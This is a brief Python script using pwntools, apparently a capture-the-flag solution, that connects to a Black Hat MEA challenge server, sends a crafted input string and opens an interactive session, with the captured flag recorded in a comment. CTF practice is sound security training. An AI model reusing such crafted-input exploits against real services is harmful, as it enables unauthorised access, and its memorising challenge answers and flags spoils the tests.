import re
import pwn
PAT = r"aaaaaaaaa0@BH.MEA"

REM = pwn.remote("blackhat4-362bc3fde529425331c2218230e82f76-0.chals.bh.ctf.sa",443,ssl=True,sni="blackhat4-362bc3fde529425331c2218230e82f76-0.chals.bh.ctf.sa")

REM.sendline(PAT)
REM.interactive()

#FLAG{1683:81:d2ddafa2f77afc450151357bf97640e5b487453c}
